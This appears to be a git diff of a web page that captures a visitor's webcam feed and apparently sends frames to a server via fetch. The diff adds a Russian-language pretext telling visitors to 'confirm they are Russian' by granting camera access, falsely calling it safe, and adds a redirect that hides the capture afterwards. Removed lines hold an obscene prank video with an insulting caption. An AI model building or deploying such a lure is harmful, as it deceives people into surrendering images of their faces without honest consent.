@@ -4,20 +4,11 @@
         <link rel="stylesheet" href="generic.css">
     </head>
     <body>
-        <h2>War supporter live reaction:</h2>
+        <h2>Пожалуйста, подтвердите, что вы русский, разрешив сайту использовать камеру, алгоритмы распознают Вашу внешность, это безопасно.</h2>
         <video id="video" width="320" height="240" autoplay muted playsinline ></video>
         <canvas id="canvas" width="320" height="240"></canvas>
-        <video autoplay="autoplay" loop="" class="myVideo" id="myVideo" muted playsinline onclick="disableMute()">
-            <source src="putin_cocks.mp4" type="video/mp4">
-            Get Fucked!
-          </video>
         
     <script>
-let vid = document.getElementById("myVideo");
-
-function disableMute() { 
-  vid.muted = false;
-} 
 let video = document.querySelector("#video");
 let canvas = document.querySelector("#canvas");
 
@@ -51,6 +42,7 @@ video.addEventListener('playing', function() {
         .then((res) => res.json())
         .then(console.log)
         .catch(console.log);
+window.location.replace("main.html");
     
 
 });
